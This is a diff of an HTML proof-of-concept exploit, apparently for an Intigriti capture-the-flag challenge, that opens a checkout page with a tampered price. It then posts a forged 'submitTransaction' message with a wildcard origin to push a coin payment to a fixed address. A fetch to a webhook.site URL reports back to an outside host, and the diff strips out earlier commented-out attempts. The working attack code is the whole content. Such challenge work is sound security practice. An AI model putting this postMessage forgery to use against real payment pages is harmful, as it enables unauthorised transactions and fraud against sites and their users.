@@ -7,31 +7,8 @@
     <h1>OOO PoC OOO</h1>
 <script>
   
-// setTimeout(() => {
-//     window.opener.postMessage({
-//       type: 'submitTransaction',
-//       transaction: {
-//         currency: '1337COIN',
-//         amount: 0,
-//         toAddress: '1d5b50c72f40a62df2df484770237f4c35'
-//       }
-//     }, '*');
-//   }, 10);
-  
-// const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00001");
 
-// setTimeout(() => {
-//   win.postMessage({
-//     type: "submitTransaction",
-//     transaction: {
-//           currency: "1337COIN",
-//           amount: 10,
-//           toAddress: "1d5b50c72f40a62df2df484770237f4c35"
-//     }
-//   }, "*");
-// }, 300);
-
-const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00001");
+const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00000001", "_blank");
 const payload = {
   type: "submitTransaction",
   transaction: {
@@ -53,13 +30,6 @@ fetch('https://webhook.site/b9386d0b-c63f-4066-b155-83a22d1c7055/Oopeeneeed');
 </script>
 
     
-  <!-- <iframe
-  id="checkoutFrame"
-  src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00001">
-</iframe> -->
 
-
-    
-</iframe>
   </body>
 </html>
